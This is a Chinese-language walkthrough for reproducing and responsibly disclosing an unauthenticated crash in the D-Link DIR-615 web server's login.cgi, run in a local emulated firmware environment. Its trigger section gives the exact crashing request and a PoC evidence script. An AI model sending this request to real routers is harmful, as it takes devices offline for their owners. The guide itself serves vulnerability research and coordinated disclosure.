# 手把手：把 DIR-615 `login.cgi` 崩溃做成一份可提交的漏洞

> 目标：你自己完整走一遍——**起服务 → 对照 → 触发 → 取证 → 写报告 → 准备提交**。
> 全程在一台本地虚拟机里，**不要对任何真实设备/公网地址做这些请求**。

## 0. 准备清单

| 项 | 检查方法 | 期望 |
|---|---|---|
| 虚拟机 | `ssh ubuntu@192.168.8.137` | 能进 |
| qemu-user | `ls /usr/bin/qemu-mips*` | 有输出 |
| rootfs（旧版，有漏洞） | `ls /home/ubuntu/lab/d615/root/sbin/httpd` | 文件存在 |
| rootfs（2015 版，对照组） | `ls /home/ubuntu/fw/reve/root/sbin/httpd` | 文件存在 |
| 取证脚本 | `ls /home/ubuntu/poc-dir615-login-cgi.sh` | 存在 |

如果脚本不在，从仓库 `tools/poc-dir615-login-cgi.sh` 拷过去。

## 1. 第一步：让服务跑起来（先别打）

```bash
R=/home/ubuntu/lab/d615/root
chroot "$R" /sbin/httpd -h /www -p 80 &
sleep 3
pgrep -af 'sbin/httpd'        # ← 应该看到一个进程
```

**判断标准**：进程存在；`ss -ltn | grep :80` 能看到监听。

> 如果起不来：先看 `chroot "$R" /sbin/httpd -h /www -p 80` 前台跑的时候
> 打印什么（常见：缺 `/dev/null`、端口被占、模板路径不对）。

## 2. 第二步：对照组（证明"服务本来是好的"）

```bash
# A. 普通页面
python3 - <<'PY'
import socket
s = socket.create_connection(("127.0.0.1", 80), 5)
s.sendall(b"GET /index.asp HTTP/1.0\r\nHost: x\r\n\r\n")
print(len(s.recv(4096)), "字节")
PY

# B. 带 graph_id 的登录页
python3 - <<'PY'
import socket
s = socket.create_connection(("127.0.0.1", 80), 5)
s.sendall(b"GET /login.cgi?graph_id=1 HTTP/1.0\r\nHost: x\r\n\r\n")
print(len(s.recv(4096)), "字节")
PY
pgrep -c 'sbin/httpd'    # ← 进程数应该还是 1
```

**期望**：返回几百到一千多字节的页面，进程还活着。

## 3. 第三步：触发（关键的一发）

```bash
python3 - <<'PY'
import socket
s = socket.create_connection(("127.0.0.1", 80), 5)
s.sendall(b"GET /login.cgi HTTP/1.0\r\nHost: x\r\n\r\n")
try:
    print("收到:", len(s.recv(4096)), "字节")
except Exception as e:
    print("连接异常:", type(e).__name__)
PY
sleep 1
pgrep -c 'sbin/httpd'    # ← 应该是 0
```

**期望**：0 字节 + 进程消失。

## 4. 第四步：一键取证（把上面三步自动做完）

```bash
cd /home/ubuntu
sudo bash poc-dir615-login-cgi.sh /home/ubuntu/lab/d615/root
```

它会生成 `evidence-<日期>-<时间>/`，里面：

| 文件 | 内容 |
|---|---|
| `summary.txt` | 每一步的字节数、状态码、进程存活状态 |
| `httpd.log` | 服务端输出（含 `qemu: uncaught target signal 11`） |

**跑两次**：一次旧版 rootfs（应崩），一次 2015 版（`/login.cgi` 404，应不崩）。

## 5. 第五步：换一个版本，确认不是偶发

```bash
sudo bash poc-dir615-login-cgi.sh /home/ubuntu/fw/reve/root
```

如果同样崩 → 版本范围扩大，报告的分量完全不同。

## 6. 第六步：把证据整理成报告

模板已存在：`docs/漏洞报告-DIR-615-login-cgi-未认证崩溃.md`。

你要补的部分：

1. **截图**：`summary.txt` 的两份（崩 / 不崩）贴进报告；
2. **环境**：固件版本、构建日期、文件哈希（`sha256sum <固件>`）；
3. **时间线**：发现时间、复现时间、写报告时间。

## 7. 第七步：投稿前自查（很关键）

| 检查 | 说明 |
|---|---|
| 是不是已知问题 | NVD 搜型号 + `login.cgi`；OpenCVE 搜产品；厂商公告 |
| 有没有夸大成 RCE | 这是**崩溃/DoS**，CVSS 约 7.5，别写"可执行代码" |
| 版本范围写清没 | 哪些版本崩、哪些不崩、哪些没测 |
| 能不能复现 | 别人拿到报告 + 固件，照第 2–3 步能不能重放 |
| 有没有影响真实设备 | **只在本地虚拟机做**，别打外网 |

## 8. 第八步：提交渠道（选一个）

| 渠道 | 地址/方式 | 适合 |
|---|---|---|
| **D-Link 安全响应** | 厂商官网 security 页面（邮件表单） | 优先，厂商能确认/修复 |
| **CNVD**（国家信息安全漏洞共享平台） | `www.cnvd.org.cn` 提交 | 国内认可度高 |
| **MITRE CNA** | `cveform.mitre.org` | 直接申请 CVE 编号 |

**提交材料**：报告（本文件第 3 节那种格式）+ 复现步骤 + 影响版本 + PoC 请求。

## 9. 常见坑

| 现象 | 原因 | 处理 |
|---|---|---|
| 服务起不来 | rootfs 里没有 `/dev/null` | `mknod $R/dev/null c 1 3` |
| 一直 404 | 用了 2015 版 rootfs（新栈） | 换 `lab/d615/root` |
| 进程没死但没响应 | 打到了别的进程 | `pkill -9 -f sbin/httpd` 后重来 |
| 三个版本都不崩 | 端口被占 / 打到了旧进程 | 每次先 `pkill` 再起 |

## 10. 做完之后你会得到什么

1. 一份**能提交**的漏洞报告（含两份对照证据）；
2. 一个**可复现的 PoC 脚本**（`tools/poc-dir615-login-cgi.sh`）；
3. 一条**明确的版本边界**（2010–2011 旧栈受影响，2015 新栈不受）；
4. 论文里"工具能产出可提交报告"的实证。
